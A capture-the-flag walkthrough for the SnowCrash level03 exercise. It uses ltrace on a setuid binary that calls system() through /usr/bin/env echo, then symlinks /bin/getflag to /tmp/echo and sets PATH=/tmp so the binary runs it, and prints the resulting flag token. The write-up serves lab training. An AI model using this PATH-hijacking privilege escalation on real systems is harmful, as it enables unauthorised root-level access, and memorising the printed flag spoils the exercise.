# SnowCrash Level03 Walkthrough

level03 is about binary exploit and how can we use what an excetuable file has to our advantage

right away when we log in to the level03 user we find an executalbe name level03 when we execute it we 

```
level03@SnowCrash:~$ ./level03
Exploit me
```

we are going to inspect all the function calls in that executable using ltrace command 

The ltrace command is a debugging and diagnostic tool in Linux used to trace library calls made by a program. It intercepts and records these calls, allowing you to see which functions are being called, with what arguments, and what their return values are.

```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7a4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                        = 2003
geteuid()                                        = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```

right away we see a system call calling echo, and that is a place where we can execute something depending on the echo command

but first we need to know what to execute

if we inspect the binaries we have we will find this :

```
level03@SnowCrash:~$ ls -la /bin
...
-rwxr-xr-x 1 root root   11833 Aug 30  2015 getflag
...
```

we see that only the root can execute this 

```
level03@SnowCrash:~$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

now we are going to create a file called echo in the /tmp directory

after we are going to create a symbolic link that binds getflag to /tmp/echo

```
ln -s /bin/getflag /tmp/echo
```

and we are going to execute it and see the results 

```
level03@SnowCrash:~$ /tmp/echo
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

now we are going to modify the PATH variable like this 

```
level03@SnowCrash:~$ export PATH=/tmp
level03@SnowCrash:~$ export | /bin/grep PATH
declare -x PATH="/tmp"
```

and after it we are going to execute the executable:

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

and we get the flag, so now we can move to the next level

